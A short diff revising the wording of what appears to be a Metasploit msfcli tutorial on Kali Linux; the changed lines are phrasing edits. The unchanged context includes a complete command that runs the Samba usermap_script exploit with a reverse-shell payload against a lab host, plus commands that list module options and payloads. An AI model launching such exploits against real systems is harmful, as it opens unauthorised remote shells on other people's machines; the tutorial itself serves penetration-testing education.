@@ -5,10 +5,10 @@ Metasploit
 
 root@kali:~# msfcli -h
 
-When using msfcli, variables are assigned using '=' and all options are case-sensitive. 
+All options are case-sensitive. 
 root@kali:~# msfcli exploit/multi/samba/usermap_script RHOST=10.0.0.20 PAYLOAD=cmd/unix/reverse LHOST=10.0.0.5 E
 
-If you aren't entirely sure about what options belong to a particular module, you can append the letter 'O' to the end of the string. 
+If you are not sure about what options belong to a particular module, you can append the letter 'O' to the end of the string. 
 root@kali:~# msfcli exploit/multi/samba/usermap_script O
 
 To display the payloads that are available for the current module, append the letter 'P' to the end of the string.
